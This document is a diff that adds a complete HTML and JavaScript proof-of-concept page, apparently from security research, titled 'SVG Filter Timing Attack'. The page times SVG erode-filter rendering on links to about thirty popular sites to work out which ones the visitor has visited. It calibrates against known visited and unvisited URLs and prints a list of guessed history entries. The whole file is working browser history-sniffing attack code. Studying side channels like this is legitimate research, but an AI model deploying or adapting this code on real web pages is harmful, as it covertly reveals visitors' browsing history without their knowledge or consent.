@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<!-- saved from url=(0051)http://dev.jigawatt.co.uk/dev/svgfilter/chrome.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>SVG Filter Timing Attack</title>
+<style>
+a rect         { fill: black }
+a:visited rect { fill: white }
+
+.p1 { fill:url(#p1) }
+.f2 { filter:url(#f2) }
+
+#out { position: absolute; left: 600px; top: 60px; -webkit-column-width: 50%; height:600px }
+</style>
+</head>
+<body>
+<h1>SVG Filter Timing Attack</h1>
+Erode Radius: <input id="radius" value="26"> filterRes: <input id="filterRes" value="372"> <button onclick="setTimeout(init, 2000)">Go</button><br>
+<div id="out">
+
+</div>
+ <script>
+var urls = [document.location.href, 'http://www.notvisited' + Math.random()+'.asd', 'https://www.facebook.com', 'https://www.google.com', 'https://www.google.co.uk', 'http://www.youtube.com', 'https://www.twitter.com', 'https://www.linkedin.com', 'http://www.craigslist.org', 'http://stackoverflow.com', 'http://www.bing.com', 'http://www.bbc.co.uk', 'http://www.microsoft.com', 'http://www.amazon.com', 'http://www.amazon.co.uk', 'http://www.mozilla.org', 'http://www.contextis.co.uk/', 'http://www.theregister.co.uk', 'http://www.reddit.com', 'http://news.ycombinator.com','http://www.ebay.co.uk','http://www.ebay.com','http://www.ask.com','http://www.msn.com', 'http://www.wordpress.com', 'http://pinterest.com','http://instagram.com','http://www.apple.com','http://www.live.com','http://en.wikipedia.org','http://www.wikileaks.org','http://arstechnica.com'];
+
+var url = 0;
+var calibiterations = 16;
+var testiterations = 4;
+var iterations = calibiterations;
+
+var maxes = [];
+var mins = [];
+var mpositive;
+var mnegative;
+var threshold;
+var svgns = "http://www.w3.org/2000/svg";
+var xlinkns = 'http://www.w3.org/1999/xlink';
+
+requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame ||  
+   window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;  
+   
+function toggle(el, cl) {
+  var c = el.getAttribute("class");
+  var bits = c.split(' ');
+  var n = [];
+  var found = false;
+  for (var i=0; i<bits.length; i++) {
+    if (bits[i] == cl) {
+      found = true;
+      continue;
+    }
+    if (bits[i].length > 0)
+      n.push(bits[i]);
+  }
+  if (!found)
+    n.push(cl);
+  c = n.join(' ');
+  el.setAttribute('class', c);
+  return c;
+}
+
+function median(list){
+	list.sort(function(a,b){return a-b});
+	if (list.length % 2){
+		var odd = list.length / 2 - 0.5;
+		return list[odd];
+	}else{
+		var even = list[list.length / 2 - 1];
+		even += list[list.length / 2];
+		even = even / 2;
+		return even;
+	}
+}
+function setURL(n) {
+	var newlink = createLink(n);
+	link.parentElement.replaceChild(newlink, link);
+	link = newlink;
+	ref.setAttribute('height', ref.getAttribute('height'));
+}
+
+function setupFilter() {
+	var radius = parseInt(document.getElementById('radius').value);
+	var filterRes = parseInt(document.getElementById('filterRes').value);
+	document.getElementById('f2').setAttribute('filterRes', filterRes);
+	document.getElementById('morph').setAttribute('radius', radius);
+}
+
+function createLink(n) {
+  var currentURL = urls[n];
+  var svg = document.getElementsByTagName('svg')[0];
+  var l = document.createElementNS(svgns, 'a');
+  l.setAttributeNS(xlinkns, 'href', currentURL);
+  var rect = document.createElementNS(svgns, 'rect');
+  l.appendChild(rect);
+  rect.setAttribute('x', '0');
+  rect.setAttribute('y', '0');
+  rect.setAttribute('width', '50');
+  rect.setAttribute('height', '50');
+  l.setAttribute('id', 'link');
+  //svg.appendChild(l);
+  //console.log(l);
+  return l;  
+}
+
+function step(timestamp) {  
+  var diff = (timestamp - start)|0;  
+  
+  if (!isNaN(start) && start != 0) {
+    
+    var t = toggle(ref, 'f2');
+    if (t.indexOf('f2') < 0)
+        maxes.push(diff);	
+    else
+        mins.push(diff);
+    if (maxes.length == iterations) {
+      var m = median(maxes);
+      var str = "<a href="+urls[url]+">"+urls[url]+"</a>" + ': ' + m + 'ms ';
+      if (url == 0) // calibrate visited (should be slower)
+        mpositive = m; 
+      else if (url == 1) { // calibrate not visited (should be quicker)
+        mnegative = m;
+        iterations = testiterations;
+        threshold = mnegative + (mpositive-mnegative)/2;
+        console.log('Threshold: ' + threshold);
+      } else {
+        str += m > threshold ? ' visited' : '';
+      }
+      //console.log(urls[url]);
+      console.log('maxes', maxes);
+      out.innerHTML += str + '<br>';
+      if (++url == urls.length) return;
+      maxes = [];
+      mins = [];
+      setURL(url);
+    }
+  }
+  start = timestamp;
+  requestAnimationFrame(step);  
+}  
+
+function init() {
+  ref = document.getElementById('reflect');
+  link = document.getElementById('link');
+  iterations = calibiterations;
+  
+  url = 0;
+  start = 0;
+  setupFilter();
+  setURL(0);
+  
+  out = document.getElementById('out');
+  out.innerHTML = '';
+  requestAnimationFrame(step);  
+}
+
+//setTimeout(init, 2000);
+</script>
+
+<svg height="600" width="500">
+  <defs>
+    <pattern id="p1" patternUnits="userSpaceOnUse" x="0" y="0" width="50" height="50">
+      <a id="link">
+        <rect x="0" y="0" width="50" height="50">
+      </rect></a>
+    </pattern>
+  </defs>
+  <filter id="f2" filterRes="172" style="color-interpolation-filters:sRGB" x="0" y="0" filterUnits="objectBoundingBox">
+    <feimage xlink:href="backgrounds/randomnoise1.png" width="150" height="150" x="0" y="0"></feimage>
+    <fetile></fetile>
+    <fecomposite in2="SourceGraphic" operator="arithmetic" k1="1"></fecomposite>
+    <femorphology operator="erode" radius="35" id="morph"></femorphology>
+  </filter>
+
+  <rect id="reflect" class="p1  f2" x="0" y="0" height="300" width="100"></rect>       
+</svg>
+
+
+
+</body></html>
